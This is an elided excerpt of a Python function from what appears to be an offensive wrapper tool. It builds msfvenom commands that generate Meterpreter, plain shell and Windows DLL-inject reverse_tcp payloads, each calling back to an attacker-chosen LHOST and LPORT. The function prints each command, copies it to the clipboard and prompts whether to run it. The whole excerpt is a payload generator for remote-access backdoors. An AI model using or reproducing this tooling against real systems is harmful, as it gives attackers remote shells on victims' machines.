...
def venomsubprocess(selectLib):
    ...
    if selectShell == 1:
        ...
        shell = "msfvenom -p {0}/meterpreter/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
        print(shell)
        clip.copy(shell)
    ...
    if selectShell == 2:
        ...
        platformSystem(selectShell, selectLib)
        name = input("Insert Name for exploit: ")
        shell = "msfvenom -p {0}/meterpreter_reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
    ...
    if selectShell == 3:
        ...
        platformSystem(selectShell, selectLib)
        name = input("Insert Name for exploit: ")
        shell = "msfvenom -p {0}/shell/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, lhost, lport, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
    ...
    if selectShell == 4:
        ...
        shell = "msfvenom -p windows/dllinject/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(lhost, lport, name)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
